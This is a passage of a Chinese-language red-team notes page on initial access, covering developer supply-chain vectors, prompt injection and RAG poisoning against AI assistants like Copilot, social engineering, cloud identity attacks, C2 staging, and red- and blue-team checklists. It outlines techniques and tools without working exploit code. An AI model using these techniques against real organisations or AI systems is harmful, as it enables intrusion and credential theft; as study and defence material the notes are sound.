+<td>clone/status 即执行；关注 CVE-2024-32002 等</td>
+</tr>
+<tr>
+<td>VS Code 扩展</td>
+<td>Marketplace 仿冒、vsix 侧载、<code>postinstall</code></td>
+<td>监控扩展目录与 <code>code.exe</code> 出网</td>
+</tr>
+<tr>
+<td>JetBrains 插件</td>
+<td>插件代码读项目与凭据</td>
+<td><code>.env</code>、云 CLI、SSH 密钥</td>
+</tr>
+<tr>
+<td>包管理器</td>
+<td>typosquat + postinstall</td>
+<td>lockfile、私有源、审计</td>
+</tr>
+<tr>
+<td>Actions</td>
+<td>恶意 Action / PR 工作流读 secrets</td>
+<td>最小权限、禁止任意 fork PR 读密</td>
+</tr>
+<tr>
+<td>容器</td>
+<td>仿冒基础镜像</td>
+<td>开发机挂载卷与环境变量外带</td>
+</tr>
+</tbody>
+</table>
+<h3 id="72-ai--llm-初始访问">7.2 AI / LLM 初始访问</h3>
+<ul>
+<li>深伪声纹 / 实时换脸：重置密码、授权 MFA、转账</li>
+<li><strong>提示注入</strong>：投毒 SharePoint/Wiki 文档，诱导 Copilot 执行危险操作或泄露上下文</li>
+<li>RAG 库投毒：改检索结果排序与内容</li>
+<li>对抗嵌入 / 隐写式指令（研究向，企业落地仍少但值得跟踪）</li>
+</ul>
+<h3 id="73-社工-20">7.3 社工 2.0</h3>
+<ul>
+<li>垃圾邮件轰炸 → 电话「IT 支援」→ Quick Assist / RMM</li>
+<li>帮助台：重置密码、改 MFA、加设备</li>
+<li>LLM 批量定制钓鱼信与多轮对话</li>
+</ul>
+<h3 id="74-云身份演进">7.4 云身份演进</h3>
+<ul>
+<li>Stealer 专注浏览器 Cookie、密码库、<code>.aws/credentials</code>、<code>.kube/config</code></li>
+<li>会话重放、OAuth 令牌、GitHub 泄露密钥</li>
+<li>跨租户 B2B、联邦 SAML、MSP 信任关系</li>
+<li><strong>Entra ID</strong>：PRT（<code>roadtx</code> / ROADtools / AADInternals）、CA 绕过、Graph 枚举与邮箱/SPO 搜索（GraphRunner 等）</li>
+<li><strong>AWS</strong>：IMDSv1 SSRF、Cognito 未认证池、Lambda 环境、S3 子域接管</li>
+</ul>
+<h3 id="75-协作与移动">7.5 协作与移动</h3>
+<ul>
+<li>恶意 Teams 应用、外部租户私信</li>
+<li>短信 / 即时通讯 + 移动浏览器 OAuth</li>
+<li>恶意 MDM 描述文件</li>
+</ul>
+<hr>
+<h2 id="8-c2-与后置阶段仅边界">8. C2 与后置阶段（仅边界）</h2>
+<p>初始访问成功后的控制面建议与投递解耦：</p>
+<ul>
+<li><strong>两阶段</strong>：一阶段极瘦、只做环境感知；二阶段内存加载、功能完整</li>
+<li>框架举例：Mythic 生态（Windows / Linux / macOS Agent 各异）、商业 C2 等——选型随行动约束变化</li>
+<li>重定向器、域前置、流量 profile 见站内《C2 监听器重定向架构》一类文章，本文不展开</li>
+</ul>
+<hr>
+<h2 id="9-红队自检清单精简">9. 红队自检清单（精简）</h2>
+<ol>
+<li>是否仍在依赖「宏一键上线」？若是，对标现网策略重做。</li>
+<li>身份路径：Device Code、AiTM、OAuth Consent、CA 缺口是否测全？</li>
+<li>投递：MOTW 链是否在<strong>目标 Windows 版本</strong>上复测？</li>
+<li>托管：是否 LOTS、信誉、HTTPS、少指纹路径？</li>
+<li>边界 0day/Nday 与默认口令是否在范围内？</li>
+<li>开发者与 CI、RMM 社工是否写进场景？</li>
+<li>遥测：邮件网关、IdP 日志、EDR 是否覆盖你的链？——红队要会「预期告警」。</li>
+</ol>
+<hr>
+<h2 id="10-蓝队优先级精简">10. 蓝队优先级（精简）</h2>
+<ol>
+<li><strong>身份</strong>：抗钓鱼 MFA、限制 Device Code、应用同意治理、令牌/会话检测。</li>
+<li><strong>邮件/Web</strong>：Safe 系列、可执行体策略、沙箱。</li>
+<li><strong>Office/ASR/MOTW</strong>：默认加固不要开豁免口子。</li>
+<li><strong>RMM</strong>：仅允许企业版、应用控制、异常远程会话告警。</li>
+<li><strong>边缘设备</strong>：补丁 SLA + 虚拟补丁。</li>
+<li><strong>开发者</strong>：私有包源、Actions 权限、扩展白名单。</li>
+<li><strong>云</strong>：IMDSv2、最小 IAM、CA 全覆盖、禁用遗留认证。</li>
+</ol>
+<hr>
+<h2 id="参考与延伸">参考与延伸</h2>
+<ul>
+<li>LOTS：<a href="https://lots-project.com/">https://lots-project.com/</a></li>
+<li>LOLBAS：<a href="https://lolbas-project.github.io/">https://lolbas-project.github.io/</a></li>
+<li>MOTW 与压缩格式行为对比（社区维护）</li>
+<li>Microsoft：ASR、WDAC、Defender for Office 365 文档</li>
+<li>身份工具生态：ROADtools、AADInternals、GraphRunner、roadtx 等（仅授权评估）</li>
+<li>公开趋势：Device Code / AiTM PhaaS 在 2025–2026 的规模化（安全厂商年度报告与 IR 统计）</li>
+</ul>
+<hr>
+<h2 id="修订说明">修订说明</h2>
+<table>
+<thead>
+<tr>
+<th>项</th>
+<th>处理</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>原文</td>
+<td>英文长篇 bullet 笔记 <code>initial-access.md</code></td>
+</tr>
+<tr>
+<td>语言</td>
+<td>全文中文技术表述</td>
+</tr>
+<tr>
+<td>结构</td>
+<td>按「向量 → 防御栈 → 绕过 → 投递链 → 专项 → 清单」重组</td>
+</tr>
+<tr>
+<td>更新</td>
+<td>强调 Device Code、AiTM 商品化、RMM 社工、开发者供应链、AI 社工与提示注入；弱化「宏为主」叙事</td>
+</tr>
+<tr>
+<td>删减</td>
+<td>指向站外缺失文档的死链段落改为原则级说明；过长重复列表合并为表格</td>
+</tr>
+<tr>
+<td>未做</td>
+<td>不包含可直接复制的武器化 exploit；Maldev Academy 课程不在本文范围</td>
+</tr>
+</tbody>
+</table>
+</div></div><aside class="toc" data-toc hidden aria-label="目录" data-astro-cid-sgg5joot><p class="toc-label" data-astro-cid-sgg5joot>目录</p><nav class="toc-nav" data-toc-nav data-astro-cid-sgg5joot></nav></aside></div></article></main><footer data-astro-cid-jo6i4kqk><div class="inner" data-astro-cid-jo6i4kqk><p class="line" data-astro-cid-jo6i4kqk>© 2026 Zumpyx</p><p class="note" data-astro-cid-jo6i4kqk>notes · exploit · write · repeat</p></div></footer><script type="module">function e(e){return e.trim().toLowerCase().replace(/\s+/g,`-`).replace(/[^\w\u4e00-\u9fff-]+/g,``).replace(/-+/g,`-`).replace(/^-|-$/g,``)||`section`}var t=null;function n(){let n=document.querySelector(`[data-article-content]`),r=document.querySelector(`[data-toc]`),i=document.querySelector(`[data-toc-nav]`);if(!n||!r||!i)return;t?.disconnect(),t=null,i.replaceChildren();let a=Array.from(n.querySelectorAll(`h2, h3`)).filter(e=>(e.textContent??``).trim().length>0);if(a.length===0){r.hidden=!0;return}r.hidden=!1;let o=new Set,s=[];for(let t of a){let n=t.id;if(!n){let r=e(t.textContent??``);n=r;let i=2;for(;o.has(n)||document.getElementById(n);)n=`${r}-${i}`,i+=1;t.id=n}o.add(n);let r=document.createElement(`a`);r.href=`#${n}`,r.textContent=(t.textContent??``).trim(),r.className=t.tagName===`H3`?`toc-h3`:`toc-h2`,r.dataset.target=n,i.appendChild(r),s.push(r)}let c=e=>{for(let t of s)t.classList.toggle(`active`,t.dataset.target===e)};t=new IntersectionObserver(e=>{let t=e.filter(e=>e.isIntersecting).sort((e,t)=>e.target.offsetTop-t.target.offsetTop);t[0]&&c(t[0].target.id)},{rootMargin:`-15% 0px -70% 0px`,threshold:[0,1]});for(let e of a)t.observe(e);location.hash?c(decodeURIComponent(location.hash.slice(1))):a[0]&&c(a[0].id)}n(),document.addEventListener(`article-content-unlocked`,()=>{n()});</script></body></html>
